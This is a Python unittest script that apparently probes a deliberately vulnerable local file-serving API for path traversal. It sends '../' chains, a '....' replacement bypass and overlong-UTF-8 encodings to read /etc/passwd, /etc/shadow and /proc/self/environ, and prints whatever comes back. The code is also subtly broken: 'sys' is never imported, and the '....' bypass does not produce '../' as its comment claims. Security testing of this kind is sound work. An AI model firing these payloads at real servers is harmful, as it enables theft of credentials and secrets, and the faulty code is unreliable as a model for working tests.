import unittest
import requests
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration from environment
API_URL = os.getenv('API_URL', 'http://localhost:3001')

class PathTraversalTest(unittest.TestCase):
    """Test cases for path traversal vulnerabilities."""
    
    WINDOWS_TARGETS = [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
        "C:\\Users\\Administrator\\Desktop\\flag.txt"
    ]
    
    LINUX_TARGETS = [
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/var/log/auth.log"
    ]
    
    def test_01_simple_path_traversal(self):
        """Test simple path traversal using path.join"""
        endpoint = f"{API_URL}/api/file/read"
        
        # Test accessing test.txt (should work)
        params = {"file": "test.txt"}
        response = requests.get(endpoint, params=params)
        self.assertEqual(response.status_code, 200, "Could not access test.txt")
        
        # Test path traversal
        for target in self.LINUX_TARGETS:  # Container is Linux
            traversal = "../" * 10 + target.lstrip("/")
            params = {"file": traversal}
            response = requests.get(endpoint, params=params)
            print(f"\n[*] Trying to access {target}")
            print(f"[*] Status: {response.status_code}")
            if response.status_code == 200:
                print(f"[*] First few lines:\n{response.text[:200]}")
            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")
    
    def test_02_bypass_replace(self):
        """Test path traversal with '../' replacement bypass"""
        endpoint = f"{API_URL}/api/file/secure-read"
        
        for target in self.LINUX_TARGETS:
            # Use '....' which becomes '../' after replace
            traversal = "...." * 10 + target.lstrip("/")
            params = {"filename": traversal}
            response = requests.get(endpoint, params=params)
            print(f"\n[*] Trying to access {target}")
            print(f"[*] Status: {response.status_code}")
            if response.status_code == 200:
                print(f"[*] First few lines:\n{response.text[:200]}")
            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")
    
    def test_03_template_traversal(self):
        """Test path traversal in template loading"""
        endpoint = f"{API_URL}/api/file/template"
        
        # Test accessing invoice.html (should work)
        params = {"template": "invoice.html"}
        response = requests.get(endpoint, params=params)
        self.assertEqual(response.status_code, 200, "Could not access invoice.html")
        
        # Test path traversal
        for target in self.LINUX_TARGETS:
            traversal = "../" * 5 + target.lstrip("/")  # Fewer ../ needed as we start in templates/
            params = {"template": traversal}
            response = requests.get(endpoint, params=params)
            print(f"\n[*] Trying to access {target}")
            print(f"[*] Status: {response.status_code}")
            if response.status_code == 200:
                print(f"[*] First few lines:\n{response.text[:200]}")
            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")
    
    def test_04_unicode_bypass(self):
        """Test path traversal with Unicode bypass"""
        endpoint = f"{API_URL}/api/file/read"
        
        for target in self.LINUX_TARGETS:
            # Use Unicode encoded '../'
            traversal = "%c0%ae%c0%ae%c0%af" * 5 + target.lstrip("/")
            params = {"file": traversal}
            response = requests.get(endpoint, params=params)
            print(f"\n[*] Trying to access {target} with Unicode bypass")
            print(f"[*] Status: {response.status_code}")
            if response.status_code == 200:
                print(f"[*] First few lines:\n{response.text[:200]}")
            self.assertIn(response.status_code, [200, 403, 404], f"Unexpected status code for {target}")

def main():
    """Run path traversal vulnerability tests."""
    parser = argparse.ArgumentParser(description='Run path traversal vulnerability tests.')
    parser.add_argument('--test', '-t', help='Run a specific test (e.g. test_01_simple_path_traversal)')
    parser.add_argument('--list', '-l', action='store_true', help='List available tests')
    args = parser.parse_args()
    
    if args.list:
        print("\nAvailable path traversal tests:")
        for name in dir(PathTraversalTest):
            if name.startswith('test_'):
                print(f"  {name}")
        return 0
    
    if args.test:
        # Run specific test
        suite = unittest.TestLoader().loadTestsFromName(args.test, PathTraversalTest)
    else:
        # Run all tests
        suite = unittest.TestLoader().loadTestsFromTestCase(PathTraversalTest)
    
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    return 0 if result.wasSuccessful() else 1

if __name__ == "__main__":
    import argparse
    sys.exit(main()) 